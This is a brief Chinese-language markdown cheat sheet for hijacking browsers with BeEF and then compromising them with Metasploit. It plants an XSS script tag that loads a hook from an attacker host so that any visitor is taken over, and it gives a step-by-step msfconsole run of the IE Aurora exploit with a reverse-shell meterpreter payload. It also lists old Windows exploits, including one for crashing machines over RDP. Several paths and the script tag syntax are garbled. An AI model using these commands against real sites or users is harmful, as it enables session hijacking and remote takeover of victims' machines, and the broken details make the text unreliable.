# beef-xss
## XSS反弹
`<script> alert("hello XSS")</script>` 
## beef-xss 和 msf框架 组合
### 环境要求：
一台kali: 192.168.200.1
### 劫持
运行beef
`cd /use/share/beef-xss` \
`./beef` \
 \
会出现一个攻击地址和一个管理地址 \
`192.168.200.1:3000/hoos.js` /攻击地址 \
`<script>src="192.168.200.1:3000/hoos.js"</script>` /上传这个，有人点击，你就可以通过beef管理进行劫持 \
`192.168.200.1:3000/ui/panwl` /管理地址，账号密码都是beef \
里面有一个是redirect选项是网站劫持，这个配合msf IE漏洞，很好用
### 漏洞利用
`msfconsole` /运行msfconsole \
`use windows/browser/ms10_002_aurora` /使用模块 \
`set PAYLOAD windows/meterpreter/reverse_tcp` /设置攻击载荷 \
`show options` /显示设置参数 \
`set SRVHOST 192.168.200.1` /制作的网站地址 \
`set SRVPORT 7777` /制作的连接的端口 \
`set URIPATH /` /运行的环境目录 \
`set LHOST 192.168.200.1` /侦听的地址 \
`set LPORT 4444` /映射到的地址 \
`run` /制作 \
将生产的网址通过劫持网站访问，就可以拿到meterpreter,即拿到shell
### IE漏洞
ms10_018 \
ms10_046 \
ms12_004 \
ms08_067 /比较老的入侵漏洞 \
ms12_020 /通过3389，搞蓝屏 
